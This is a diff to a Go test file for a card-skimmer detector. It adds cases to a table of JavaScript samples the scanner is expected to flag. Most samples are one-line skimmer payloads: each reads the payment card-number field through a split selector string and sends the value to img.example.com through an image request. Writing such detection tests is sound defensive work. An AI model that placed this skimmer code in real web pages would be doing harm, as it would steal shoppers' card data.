@@ -53,6 +53,8 @@ func TestSkimmerSignals(t *testing.T) {
 		"regex after if":    {`if(x)/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"regex after block": {`{x()}/["']/.test(y);var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"division after ++": {`i++/2/3;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"after an object":   {`var o={a:1}/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"keyword property":  {`var x=a.return/2;var f=document.querySelector('[name="payment[cc'+'_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"jquery-ish":        {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
 	} {
 		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
